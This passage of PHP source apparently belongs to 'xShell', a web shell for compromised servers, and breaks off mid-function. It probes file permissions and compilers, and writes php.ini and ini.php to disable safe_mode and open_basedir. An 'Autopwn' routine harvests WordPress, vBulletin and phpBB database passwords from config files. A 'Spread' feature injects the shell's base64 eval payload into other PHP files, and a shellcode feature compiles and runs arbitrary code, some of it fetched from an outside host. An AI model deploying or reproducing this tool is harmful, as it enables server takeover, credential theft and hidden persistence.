		if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] < 6 || isset ($_GET ['first_run']))
		{
			$_GET ['action'] = NULL;							/* Don't do anything yet! */
			define ('PAGE_TITLE', 'First Run Setup');
			
			if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] == 0)
			{
				echo '<h2>First Run</h2>';
				echo '<p>xShell will scan the host for information. Press Begin to start testing</p>';
				setcookie ('XSHELL_FIRST_RUN_STEP', 1);
				echo '<form><input type="submit" value="Begin" style="float:right;" /></form>';
			}
			
			/* **************************** File Permissions ***************************** */
			if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] == 1)
			{
				echo '<h2>Testing file permissions...</h2>';
				
				/* **************************** Write new file ******************************* */
				echo 'Write to current directory: ';
				$file = md5 (time ());
				if (@file_put_contents ($file, $file) === false)
				{
					setcookie ('XSHELL_FILE_WRITE_NEW', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FILE_WRITE_NEW', 1);
					echo '<span class="success">Success!</span><br />';
				}
				
				/* ************************** Write existing file **************************** */
				echo 'Write existing file in directory: ';
				$file = fopen (FILE, 'a');
				if (@fwrite ($file, ' ') === false)
				{
					setcookie ('XSHELL_FILE_WRITE_EXISTING', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FILE_WRITE_EXISTING', 1);
					echo '<span class="success">Success!</span><br />';
				}
				
				/* *************************** Read existing file **************************** */
				echo 'Read existing file in directory: ';
				if (@file_get_contents (FILE) === false)
				{
					setcookie ('XSHELL_FILE_READ', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FILE_READ', 1);
					echo '<span class="success">Success!</span><br />';
				}
				
				/* ************************* Create arbitrary file *************************** */
				echo 'Create arbitrary file: ';
				$file = md5 (time ());
				if (@file_put_contents (DRIVE_ROOT . $file, $file) === false)
				{
					setcookie ('XSHELL_FILE_WRITE_ARBITRARY', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FILE_WRITE_ARBITRARY', 1);
					echo '<span class="success">Success!</span><br />';
				}
				
				/* ************************** Read arbitrary file *************************** */
				echo 'Read arbitrary file: ';
				$file = '';
				foreach (scandir (DRIVE_ROOT) as $files)
				{
					if (is_file (DRIVE_ROOT . $files))
					{
						$file = DRIVE_ROOT . $files;
					}
				}
				if (@file_get_contents ($file) === false)
				{
					setcookie ('XSHELL_FILE_READ_ARBITRARY', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FILE_READ_ARBITRARY', 1);
					echo '<span class="success">Success!</span><br />';
				}
				
				/* **************************** Read remote file ***************************** */
				echo 'Read remote file: ';
				$file = 'http://www.google.com/';
				if (@file_get_contents ($file) === false)
				{
					setcookie ('XSHELL_FILE_READ_REMOTE', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FILE_READ_REMOTE', 1);
					echo '<span class="success">Success!</span><br />';
				}
				
				setcookie ('XSHELL_FIRST_RUN_STEP', 2);
				echo '<form><input type="submit" value="Next" style="float:right;" /></form>';
			}
			
			/* ****************************** System Setup ******************************* */
			else if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] == 2)
			{
				echo '<h2>System Setup...</h2>';
				
				/* ******************************* Check shell ******************************** */
				
				/* ***************************** Find a compiler ****************************** */
				
				setcookie ('XSHELL_SYS_ASSEMBLER', 0);
				setcookie ('XSHELL_SYS_C_COMPILER', 0);
				
				/* Try gcc */
				echo 'Looking for gcc: ';
				if (strlen (shell_exec ('gcc --help')) > 0)
				{
					setcookie ('XSHELL_SYS_GCC', 1);
					setcookie ('XSHELL_SYS_C_COMPILER', 1);
					echo '<span class="success">Success!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_SYS_GCC', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				
				/* Try g++ */
				echo 'Looking for g++: ';
				if (strlen (shell_exec ('g++ --help')) > 0)
				{
					setcookie ('XSHELL_SYS_GPP', 1);
					setcookie ('XSHELL_SYS_C_COMPILER', 1);
					echo '<span class="success">Success!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_SYS_GPP', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				
				/* Try NASM */
				echo 'Looking for NASM: ';
				if (strlen (shell_exec ('nasm -h')) > 0)
				{
					setcookie ('XSHELL_SYS_NASM', 1);
					setcookie ('XSHELL_SYS_ASSEMBLER', 1);
					echo '<span class="success">Success!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_SYS_NASM', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				
				/* Try MASM */
				echo 'Looking for MASM: ';
				if (strlen (shell_exec ('masm -h')) > 0)
				{
					setcookie ('XSHELL_SYS_MASM', 1);
					setcookie ('XSHELL_SYS_ASSEMBLER', 1);
					echo '<span class="success">Success!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_SYS_MASM', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				
				/* Try python */
				echo 'Looking for python: ';
				if (strlen (shell_exec ('python --help')) > 0)
				{
					setcookie ('XSHELL_SYS_PYTHON', 1);
					echo '<span class="success">Success!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_SYS_PYTHON', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				
				/* Try perl */
				echo 'Looking for perl: ';
				if (strlen (shell_exec ('perl --help')) > 0)
				{
					setcookie ('XSHELL_SYS_PERL', 1);
					echo '<span class="success">Success!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_SYS_PERL', 0);
					echo '<span class="failure">Failed!</span><br />';
				}
				
				setcookie ('XSHELL_FIRST_RUN_STEP', 3);
				echo '<br />';
				echo '<form><input type="submit" value="Next" style="float:right;" /></form>';
			}
			else if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] == 3)
			{
				echo '<h2>Setting up files...</h2>';
				
				/* ******************************* .htaccess ********************************* */
				echo 'Writing .htaccess: ';
				
				/* Temporarily disabled until I get it working */
				/* TODO: FIX IT! */
				
				/*$content = '<IfModule mod_security.c>
				SecFilterEngine Off
				SecFilterScanPOST Off
				SecFilterCheckURLEncoding Off
				SecFilterCheckCookieFormat Off
				SecFilterCheckUnicodeEncoding Off
				SecFilterNormalizeCookies Off
				</IfModule>
				SetEnv PHPRC ' . CURRENT_PATH . DIRECTORY_SEPARATOR . 'php.ini
				suPHP_ConfigPath ' . CURRENT_PATH . DIRECTORY_SEPARATOR . 'php.ini';
				if (@file_put_contents ('.htaccess', $content) === false)
				{*/
					echo '<span class="failure">Failed!</span><br />';
				/*}
				else
				{
					echo '<span class="success">Success!</span><br />';
				}*/
				
				
				/* ******************************** php.ini ********************************** */
				echo 'Writing php.ini: ';
				$content = 'safe_mode = Off
				disable_functions = NONE
				safe_mode_gid = OFF
				open_basedir = OFF';
				if (@file_put_contents ('php.ini', $content) === false)
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					echo '<span class="success">Success!</span><br />';
				}
				
				/* ******************************** ini.php ********************************** */
				echo 'Writing ini.php: ';
				$content = 'ini_restore("safe_mode");
				ini_restore("open_basedir");';
				if (@file_put_contents ('ini.php', $content) === false)
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					echo '<span class="success">Success!</span><br />';
				}
				
				setcookie ('XSHELL_FIRST_RUN_STEP', 4);
				echo '<form><input type="submit" value="Next" style="float:right;" /></form>';
			}
			
			/* ******************************* Find Servers ******************************** */
			
			else if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] == 4)
			{
				echo '<h2>Finding servers...</h2>';
				
				/* *********************************** FTP ************************************* */
				echo 'Looking for FTP server...<br />';
				setcookie ('XSHELL_FTP_SERVER', '', time () - 3600);
				
				echo 'Trying ' . SERVER_URL . '... ';
				$ftp = ftp_connect (SERVER_URL);
				if ($ftp === false)
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FTP_SERVER', SERVER_URL);
					echo '<span class="success">Success!</span><br />';
					ftp_close ($ftp);
				}
				
				echo 'Trying ftp.' . SERVER_URL . '... ';
				$ftp = ftp_connect ('ftp.' . SERVER_URL);
				if ($ftp === false)
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FTP_SERVER', 'ftp.' . SERVER_URL);
					echo '<span class="success">Success!</span><br />';
					ftp_close ($ftp);
				}
				
				echo 'Trying 127.0.0.1... ';
				$ftp = ftp_connect ('127.0.0.1');
				if ($ftp === false)
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				else
				{
					setcookie ('XSHELL_FTP_SERVER', '127.0.0.1');
					echo '<span class="success">Success!</span><br />';
					ftp_close ($ftp);
				}
				
				/* *********************************** MySQL ************************************* */
				echo 'Looking for MySQL server...<br />';
				setcookie ('XSHELL_MYSQL_SERVER', '', time () - 3600);
				
				echo 'Trying ' . SERVER_URL . '... ';
				$mysql = mysql_connect (SERVER_URL);
				if ($mysql !== false || mysql_errno ($mysql) !== 2005)
				{
					setcookie ('XSHELL_MYSQL_SERVER', SERVER_URL);
					echo '<span class="success">Success!</span><br />';
					mysql_close ($mysql);
				}
				else
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				
				echo 'Trying localhost... ';
				$mysql = mysql_connect ('localhost');
				if ($mysql !== false || mysql_errno ($mysql) !== 2005)
				{
					setcookie ('XSHELL_MYSQL_SERVER', 'localhost');
					echo '<span class="success">Success!</span><br />';
					mysql_close ($mysql);
				}
				else
				{
					echo '<span class="failure">Failed!</span><br />';
				}
				
				setcookie ('XSHELL_FIRST_RUN_STEP', 5);
				echo '<form><input type="submit" value="Next" style="float:right;" /></form>';
			}
				
			else if ($_COOKIE ['XSHELL_FIRST_RUN_STEP'] == 5)
			{
				echo '<h2>Testing Finished!</h2>';
				echo '<p>Press finish to complete setup</p>';
				setcookie ('XSHELL_FIRST_RUN_STEP', 6);
				echo '<form><input type="submit" value="Finish" style="float:right;" /></form>';
			}
		}
		
		define ('FILE_WRITE_NEW', @$_COOKIE ['XSHELL_FILE_WRITE_NEW']);
		define ('FILE_WRITE_EXISTING', @$_COOKIE ['XSHELL_FILE_WRITE_EXISTING']);
		define ('FILE_READ', @$_COOKIE ['XSHELL_FILE_READ']);
		define ('FILE_WRITE_ARBITRARY', @$_COOKIE ['XSHELL_FILE_WRITE_ARBITRARY']);
		define ('FILE_READ_ARBITRARY', @$_COOKIE ['XSHELL_FILE_READ_ARBITRARY']);
		define ('FILE_READ_REMOTE', @$_COOKIE ['XSHELL_FILE_READ_REMOTE']);
		
		define ('SYS_ASSEMBLER', @$_COOKIE ['XSHELL_SYS_ASSEMBLER']);
		define ('SYS_C_COMPILER', @$_COOKIE ['XSHELL_SYS_C_COMPILER']);
		define ('SYS_NASM', @$_COOKIE ['XSHELL_SYS_NASM']);
		define ('SYS_MASM', @$_COOKIE ['XSHELL_SYS_MASM']);
		define ('SYS_GCC', @$_COOKIE ['XSHELL_SYS_GCC']);
		define ('SYS_GPP', @$_COOKIE ['XSHELL_SYS_GPP']);
		define ('SYS_PERL', @$_COOKIE ['XSHELL_SYS_PERL']);
		define ('SYS_PYTHON', @$_COOKIE ['XSHELL_SYS_PYTHON']);
		
		if (isset ($_COOKIE ['XSHELL_FTP_SERVER'])) {define ('FTP_SERVER', $_COOKIE ['XSHELL_FTP_SERVER']);}
		if (isset ($_COOKIE ['XSHELL_MYSQL_SERVER'])) {define ('MYSQL_SERVER', $_COOKIE ['XSHELL_MYSQL_SERVER']);}
		
		/* ******************************* Some functions **************************** */
		function get_remote_file ($url)
		{
			if (FILE_READ_REMOTE)
			{
				return file_get_contents ($url);
			}
			if (function_exists('curl_init'))
			{
				$ch = curl_init(); 
				curl_setopt($ch, CURLOPT_URL, $url); 
				curl_setopt($ch, CURLOPT_HEADER, 0); 
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0'); 
				$content = curl_exec($ch); 
				curl_close($ch); 
				return $content;
			}
			return false;
		}
		
		function get_file_from_path ($path)
		{
			$path = explode (DIRECTORY_SEPARATOR, $path);
			return $path [count ($path) - 1];
		}
		
		/* ************************** Evaluate exploitability ************************ */
		$exp = 5;								/* Lower is better */
		if (PHP_USER_ID > 0) {$exp = max (0, $exp - 1);}
		if (defined ('SAFE_MODE')) {$exp = max (0, $exp - 1);}
		if (SYS_C_COMPILER || SYS_ASSEMBLER) {$exp = min (10, $exp + 1);}
		if (FILE_WRITE_NEW) {$exp = min (10, $exp + 1);}
		if (FILE_READ_ARBITRARY) {$exp = min (10, $exp + 1);}
		define ('EXPLOITABILITY', $exp);
		
		/* *************************************************************************** */
		/*                              == Shellcode ==                                */
		/*  Execute arbitrary shellcode                                                */
		/*                                                                             */
		/* *************************************************************************** */
		
		function execute_shellcode ($code)
		{
			/* ************************** Compile with a C compiler *************************** */
			if (SYS_C_COMPILER)
			{
				$code = 'char code [] = "' . $code . '";' . "\n" . 
					'void main (void) {' . "\n" . 
					'void (*shellcode)() = code;' . "\n" . 
					'shellcode();}';
				if (FILE_WRITE_NEW)
				{
					/* Can make a new file */
					$file = md5 (time ());
					file_put_contents ($file . '.c', $code);
					c_compile ($file . '.c', $file);
					execute_command ('./' . $file);
					return true; 
				}
				else if (FILE_WRITE_EXISTING)
				{
					/* Can't make a new file, use this one */
					$file = FILE;
					$old_contents = file_get_contents ($file);
					file_put_contents ($file, $code);
					c_compile ($file, $file . '.out');
					file_put_contents ($file, $old_contents);
					execute_command ('./' . $file . '.out');
					return true;
				}
				else
				{
					return false;
				}
			}
			else if (SYS_ASSEMBLER)
			{
				/* TODO: Add support for assembling shellcode */
			}
		}
		
		function assemble ($file, $output)
		{
			if (SYS_NASM)
			{
				if (PHP_OS == 'Linux')
				{
					execute_command ('nasm -o ' . $output . ' -f elf ' . $file);
				}
				if (PHP_OS == 'Windows')
				{
					execute_command ('nasm -o ' . $output . ' -f win32 ' . $file);
				}
			}
			else if (SYS_MASM)
			{
				/* TODO: Add MASM support */
				
			}
			else
			{
				return false;
			}
		}
		
		function c_compile ($file, $output)
		{
			if (SYS_GCC)
			{
				execute_command ('gcc -o ' . $output . ' ' . $file);
			}
			else if (SYS_GPP)
			{
				execute_command ('g++ -o ' . $output . ' ' . $file);
			}
			else
			{
				return false;
			}
		}
		
		/* *************************************************************************** */
		/*                             == Information ==                               */
		/*  Gather basic information about the host;                                   */
		/*  Basic - general information                                                */
		/*  Phpinfo - phpinfo ()                                                       */
		/*  TODO: Vulnerability index                                                  */
		/* *************************************************************************** */
	
		if ($_GET ['action'] == 'information')
		{
			$page -> sidebar = array ('basic', 'phpinfo');
			
			/* *************************** Basic Information ***************************** */
			if (@$_GET ['information'] == 'basic')
			{
				define ('PAGE_TITLE', 'Basic Information');
				echo '<b>File:</b> ' . FILE . '<br />';
				echo '<b>Current Path:</b> ' . CURRENT_PATH . '<br />';
				echo '<b>PHP Version:</b> ' . PHP_VERSION . '<br />';
				echo '<b>OS:</b> ' . PHP_OS . '<br />';
				echo '<b>System:</b> ' . UNAME . '<br />';
				echo '<b>User:</b> ' . PHP_USER . ' (' . PHP_USER_ID . ')<br />';
				echo '<b>Exploitability:</b> ' . $exp . '<br />';
				echo '<b>Safe Mode:</b> '; if (defined ('SAFE_MODE')) {echo '<span class="failure">[ YES ]</span><br />';} else {echo '<span class="success">[ NO ]</span><br />';}
				echo '<b>MySQL:</b> '; if (defined ('MYSQL')) {echo '<span class="success">[ YES ]</span><br />';} else {echo '<span class="failure">[ NO ]</span><br />';}
				echo '<b>MySQLi:</b> '; if (defined ('MYSQLI')) {echo '<span class="success">[ YES ]</span><br />';} else {echo '<span class="failure">[ NO ]</span><br />';}
				echo '<b>File Permissions:</b> '; if (FILE_WRITE_NEW) {echo '<span class="success">[ Write New ] </span>';} if (FILE_WRITE_EXISTING) {echo '<span class="success">[ Write Existing ] </span>';} if (FILE_READ) {echo '<span class="success">[ Read ] </span>';} if (FILE_WRITE_ARBITRARY) {echo '<span class="success">[ Write Arbitrary ] </span>';} if (FILE_READ_ARBITRARY) {echo '<span class="success">[ Read Arbitrary ] </span>';} if (FILE_READ_REMOTE) {echo '<span class="success">[ Read Remote ] </span>';}
				echo '<br />';
				echo '<b>Compilers:</b> '; if (SYS_NASM) {echo 'NASM ';} if (SYS_MASM) {echo 'MASM ';} if (SYS_GCC) {echo 'gcc ';} if (SYS_GPP) {echo 'g++ ';}
				echo '<br />';
				echo '<b>Perl:</b> '; if (SYS_PERL) {echo '<span class="success">[ YES ]</span><br />';} else {echo '<span class="failure">[ NO ]</span><br />';}
				echo '<b>Python:</b> '; if (SYS_PYTHON) {echo '<span class="success">[ YES ]</span><br />';} else {echo '<span class="failure">[ NO ]</span><br />';}
				echo '<b>Extensions:</b> ';
				foreach (get_loaded_extensions () as $extension)
				{
					echo $extension . ' ';
				}
				echo '<br />';
				echo '<b>FTP Server:</b> '; if (defined ('FTP_SERVER')) {echo '<span class="success">' . FTP_SERVER . '</span><br />';} else {echo '<span class="failure">[ NO ]</span><br />';}
				echo '<b>MySQL Server:</b> '; if (defined ('MYSQL_SERVER')) {echo '<span class="success">' . MYSQL_SERVER . '</span><br />';} else {echo '<span class="failure">[ NO ]</span><br />';}
			}
			
			/* ******************************* phpinfo () ******************************** */
			else if (@$_GET ['information'] == 'phpinfo')
			{
				define ('PAGE_TITLE', 'phpinfo');
				phpinfo ();
				$out = ob_get_clean ();							/* Get output from buffer */
				$a = array ();
				preg_match ('#(<body>)(.*)(</body>)#s', $out, $a);			/* Remove body tags */
				$page -> content = $a [2];						/* For some reason, echoing it doesn't work? */
			}
			
			else
			{
			
			}
		}
		
		/* *************************************************************************** */
		/*                              ==  Exploit  ==                                */
		/*  Try to exploit vulnerabilities in the host                                 */
		/*  Config - try to find information in config files                           */
		/*  Autopwn - find interesting files on the web server and exploit             */
		/*  Spread - bind to another file                                              */
		/*  Shellcode - run shell code                                                 */
		/*                                                                             */
		/* *************************************************************************** */
		
		if ($_GET ['action'] == 'exploit')
		{
			$page -> sidebar = array ('config', 'autopwn', 'spread', 'shellcode');
			
			/* ******************************** Config *********************************** */
			if (@$_GET ['exploit'] == 'config')
			{
				define ('PAGE_TITLE', 'Config');
				$config = find_config_files ();
			}
			
			/* ******************************* Autopwn *********************************** */
			
			else if (@$_GET ['exploit'] == 'autopwn')
			{
				define ('PAGE_TITLE', 'Autopwn');

				if (PHP_OS == 'Linux')
				{
					$files = shell_exec ('find');
					$files = explode ("\n", $files);
					foreach ($files as $file)
					{
						$f = get_file_from_path ($file);
						if ($f === 'wp-config.php')
						{
							/* Wordpress! */
							echo 'Scanning ' . $file . '...<br />';
							$content = file_get_contents ($file);
							$content = explode ("\n", $content);
							foreach ($content as $line)
							{
								if (strpos ($line, 'DB_NAME') !== false)
								{
									eval ($line);
									echo '&nbsp;<span class="success">Found Wordpress database: ' . DB_NAME . '</span><br />';
								}
								if (strpos ($line, 'DB_USER') !== false)
								{
									eval ($line);
									echo '&nbsp;<span class="success">Found Wordpress database user: ' . DB_USER . '</span><br />';
								}
								if (strpos ($line, 'DB_PASSWORD') !== false)
								{
									eval ($line);
									echo '&nbsp;<span class="success">Found Wordpress database password: ' . DB_PASSWORD . '</span><br />';
								}
								if (strpos ($line, 'DB_HOST') !== false)
								{
									eval ($line);
									echo '&nbsp;<span class="success">Found Wordpress database host: ' . DB_HOST . '</span><br />';
								}
							}
							if (defined ('DB_USER') && defined ('DB_PASSWORD') && defined ('DB_HOST'))
							{
								echo '<form action="?action=database&database=connect" method="POST"><input type="hidden" name="server" value="' . DB_HOST . '" /><input type="hidden" name="username" value="' . DB_USER . '" /><input type="hidden" name="password" value="' . DB_PASSWORD . '" /><input type="submit" value="Connect" /></form><br />';
							}
						}
						if ($f == 'config.php')
						{
							echo 'Scanning ' . $file . '...<br />';
							$content = file_get_contents ($file);
							if (stripos ($content, 'vbulletin') !== false)
							{
								/* vBulletin! */
								$content = explode ("\n", $content);
								foreach ($content as $line)
								{
									if (strpos ($line, 'dbname'))
									{
										eval ('global $config; ' . $line);
										echo '&nbsp;<span class="success">Found vBulletin database: ' . $config['Database']['dbname'] . '</span><br />';
									}
									if (strpos ($line, 'servername'))
									{
										eval ('global $config; ' . $line);
										echo '&nbsp;<span class="success">Found vBulletin database server: ' . $config['MasterServer']['servername'] . '</span><br />';
									}
									if (strpos ($line, 'username'))
									{
										eval ('global $config; ' . $line);
										echo '&nbsp;<span class="success">Found vBulletin database username: ' . $config['MasterServer']['username'] . '</span><br />';
									}
									if (strpos ($line, 'password'))
									{
										eval ('global $config; ' . $line);
										echo '&nbsp;<span class="success">Found vBulletin database password: ' . $config['MasterServer']['password'] . '</span><br />';
									}
								}
								if (!(empty ($config)))
								{
									echo '<form action="?action=database&database=connect" method="POST"><input type="hidden" name="server" value="' . $config['MasterServer']['servername'] . '" /><input type="hidden" name="username" value="' . $config['MasterServer']['username'] . '" /><input type="hidden" name="password" value="' . $config['MasterServer']['password'] . '" /><input type="submit" value="Connect" /></form><br />';
								}
							}
							
							if (stripos ($content, 'phpbb') !== false)
							{
								/* phpBB! */
								$content = explode ("\n", $content);
								foreach ($content as $line)
								{
									if (strpos ($line, 'dbhost'))
									{
										eval ('global $dbhost; ' . $line);
										echo '&nbsp;<span class="success">Found phpBB database host: ' . $dbhost . '</span><br />';
									}
									if (strpos ($line, 'dbname'))
									{
										eval ('global $dbname; ' . $line);
										echo '&nbsp;<span class="success">Found phpBB database name: ' . $dbname . '</span><br />';
									}
									if (strpos ($line, 'dbuser'))
									{
										eval ('global $dbuser; ' . $line);
										echo '&nbsp;<span class="success">Found phpBB database user: ' . $dbuser . '</span><br />';
									}
									if (strpos ($line, 'dbpasswd'))
									{
										eval ('global $dbpasswd; ' . $line);
										echo '&nbsp;<span class="success">Found phpBB database password: ' . $dbpasswd . '</span><br />';
									}
								}
								if (!(empty ($dbhost) && empty ($dbname) && empty ($dbuser)) && empty ($dbpasswd))
								{
									echo '<form action="?action=database&database=connect" method="POST"><input type="hidden" name="server" value="' . $dbhost . '" /><input type="hidden" name="username" value="' . $dbuser . '" /><input type="hidden" name="password" value="' . $dbpasswd . '" /><input type="submit" value="Connect" /></form><br />';
								}
							}
						}
						
						/* TODO: Add more autopwns! */
						/* Joomla, IPB, etc, maybe an intelligent config file crawler? */
					}
				}
				/* TODO: Add Windows support */
				/* Fuck you Microsoft. Who runs IIS anyway? */
			}
			
			/* ******************************** Spread *********************************** */
			
			else if (@$_GET ['exploit'] == 'spread')
			{
				define ('PAGE_TITLE', 'Spread');
				if (!isset ($_GET ['edit']))
				{
					echo '<form><input type="hidden" name="action" value="files" /><input type="hidden" name="files" value="browse" /><input type="hidden" name="trackback" value="action=exploit&exploit=spread" /><input type="submit" value="Select a file to bind to" /></form>';
				}
				else
				{
					$insert = file_get_contents (FILE);
					$original = file_get_contents ($_GET ['edit']);
					$a = array ();
					preg_match ('#eval\(base64_decode\("[A-Za-z0-9\\\+=/]*"\)\);#', $insert, $a);
					$new = '<?php ' . $a [0] . ' ?> ' . $original;
					file_put_contents ($_GET ['edit'], $new);
					echo '<span class="success">xShell successfully bound to ' . $_GET ['edit'] . '!</span>';
				}
			}
			
			/* ****************************** Shellcode ********************************* */
			
			else if (@$_GET ['exploit'] == 'shellcode')
			{
				define ('PAGE_TITLE', 'Shellcode');
				if (isset ($_GET ['shellcode']))
				{
					if ($_GET ['shellcode'] == 'browse')
					{
						$url = 'http://www.quetuo.net/xShell/shellcodes.php?action=shellcodes&hash=' . md5 (md5 (PASSKEY) . md5 ('shellcodes'));
						$content = get_remote_file ($url);
						$shellcodes = explode ("\n", $content);
						echo '<b>Available shellcodes:</b><br />';
						foreach ($shellcodes as $shellcode)
						{
							$s = explode (":", $shellcode);
							echo '<a href="?action=exploit&exploit=shellcode&shellcode=' . $s [0] . '" style="color:white;">' . $s [1] . '</a><br />';
						}
					}
					else if ($_GET ['shellcode'] == 'execute')
					{
						if (isset ($_POST ['shellcode']))
						{
							if (execute_shellcode ($_POST ['shellcode']))
							{
								echo '<span class="success">Shellcode executed!</span>';
							}
							else
							{
								echo '<span class="failure">Failed to execute shellcode!</span>';
							}
						}
						else
						{
							echo '<form method="POST"><textarea style="width: 100%; height: 75%;" name="shellcode"></textarea><input type="submit" value="Execute" /></form>';
						}
					}
					else
					{
						$url = 'http://www.quetuo.net/xShell/shellcodes.php?action=shellcode&hash=' . md5 (md5 (PASSKEY) . md5 ('shellcode')) . '&id=' . $_GET ['shellcode'];
						$content = get_remote_file ($url);
						if (execute_shellcode ($content))
						{
							echo '<span class="success">Shellcode executed!</span>';
						}
						else
						{
							echo '<span class="failure">Failed to execute shellcode!</span>';
						}
					}					
				}
				else
				{
					echo '<b>Shellcode</b><br />';
					if (defined ('XSHELL_PRO'))
					{
						echo 'Choose to either browse or execute arbitrary shellcodes<br />';
						echo '<form><input type="hidden" name="action" value="exploit" /><input type="hidden" name="exploit" value="shellcode" /><input type="hidden" name="shellcode" value="browse" /><input type="submit" value="Browse" /></form>';
					}
					else
					{
						echo 'Click below to enter shellcode to execute<br />';
					}
					echo '<form><input type="hidden" name="action" value="exploit" /><input type="hidden" name="exploit" value="shellcode" /><input type="hidden" name="shellcode" value="execute" /><input type="submit" value="Execute" /></form>';
				}
			}
			
			
			else
			{
				define ('PAGE_TITLE', 'Exploit');
				echo '<b>Exploit</b><br />';
				echo '<p>The exploit functions allow you to exploit vulnerabilities on the server to gain higher access and privileges<br />';
				echo '<i>Config</i> gathers information about the server from configuration files<br />';
				echo '<i>Autopwn</i> binds to existing web applications on the server to find configuration values such as database passwords<br />';
				echo '<i>Spread</i> allows you to bind xShell to another PHP file, hidden until the password is entered<br />';
				echo '<i>Shellcode</i> allowd you to execute arbitrary shellcode<br />';
				echo '</p>';
			}
		}
		
		/* *************************************************************************** */
		/*                                == Files ==                                  */
		/*  Manipulate files                                                           */
		/*  Browse - browse files on the host                                          */
		/*  Edit - edit files on the host with a text-editor                           */
		/*  (Delete) - delete files from the host                                      */
		/*  Download - download files from the host                                    */
		/*  Upload - upload files to the host                                          */
		/*  Get - get a file from the internet and download it to the host             */
		/*                                                                             */
		/* *************************************************************************** */
		
		if ($_GET ['action'] == 'files')
		{
			$page -> sidebar = array ('browse', 'edit', 'delete', 'download', 'upload', 'get');
			if (@$_GET ['files'] == 'browse')
			{
				define ('PAGE_TITLE', 'File Browser');
				if (!isset ($_GET ['browse']))
				{
					$_GET ['browse'] = CURRENT_PATH;
				}
				$_GET ['browse'] = realpath ($_GET ['browse']);
				echo 'Browsing ' . $_GET ['browse'] . '<br />';
				$files = scandir ($_GET ['browse']);
				echo '<table><tr><td width="50%">Name</td><td width="10%">Size</td><td width="10%"></td></tr>';
				foreach ($files as $file)
				{
					if (is_dir ($file) && !isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?action=files&files=browse&browse=' . $_GET ['browse'] . DIRECTORY_SEPARATOR . $file . '">' . $file . '</td><td>.</td></tr>';}
					if (is_dir ($file) && isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?action=files&files=browse&browse=' . $_GET ['browse'] . DIRECTORY_SEPARATOR . $file . '&trackback=' . urlencode ($_GET ['trackback']) . '">' . $file . '</td><td>.</td></tr>';}
					if (is_file ($file) && !isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?action=files&files=edit&edit=' . $_GET ['browse'] . DIRECTORY_SEPARATOR . $file . '">' . $file . '</td><td>' . filesize ($file) . '</td><td><a style="color:red;" href="?action=files&files=delete&edit=' . $_GET ['browse'] . DIRECTORY_SEPARATOR . $file . '">[ DEL ]</a></td></tr>';}
					if (is_file ($file) && isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?' . $_GET ['trackback'] . '&edit=' . $_GET ['browse'] . DIRECTORY_SEPARATOR . $file . '">' . $file . '</td><td>' . filesize ($file) . '</td><td><a style="color:red;" href="?action=files&files=delete&edit=' . $_GET ['browse'] . DIRECTORY_SEPARATOR . $file . '">[ DEL ]</a></td></tr>';}
				}
				echo '</table>';
			}
			else if (@$_GET ['files'] == 'edit')
			{
				define ('PAGE_TITLE', 'File Editor');
				if (isset ($_GET ['edit']))
				{
					if (isset ($_POST ['content']))
					{
						if (@file_put_contents ($_GET ['edit'], html_entity_decode ($_POST ['content'])) === false) {echo '<span class="failure">Could not save!</span><br />';}
						else {echo '<span class="success">Saved!</span><br />';}
						rename ($_GET ['edit'], $_POST ['file']);
						$_GET ['edit'] = $_POST ['file'];
					}
					echo 'Editing ' . $_GET ['edit'] . '<br />';
					$file_contents = htmlentities (file_get_contents ($_GET ['edit']));
					echo '<form method="POST"><textarea style="width: 100%; height: 75%;" name="content">' . $file_contents . '</textarea><br /><input name="file" autocomplete="off" value="' . $_GET ['edit'] . '" style="width:60%;color: #DDDDDD;background-color: #222222;border:none;" /><input type="submit" value="save" style="float:right;" /></form>';
				}
				else
				{
					echo '<form><input type="hidden" name="action" value="files" /><input type="hidden" name="files" value="browse" /><input type="hidden" name="trackback" value="action=files&files=edit" /><input type="submit" value="Select a file to edit" /></form>';
				}
			}
			else if (@$_GET ['files'] == 'delete')
			{
				define ('PAGE_TITLE', 'File Deletion');
				if (isset ($_GET ['edit']))
				{
					if (unlink ($_GET ['edit']) === false) {echo '<span class="failure">Could not delete!</span><br />';}
					else {echo '<span class="success">Deleted!</span><br />';}
				}
				else
				{
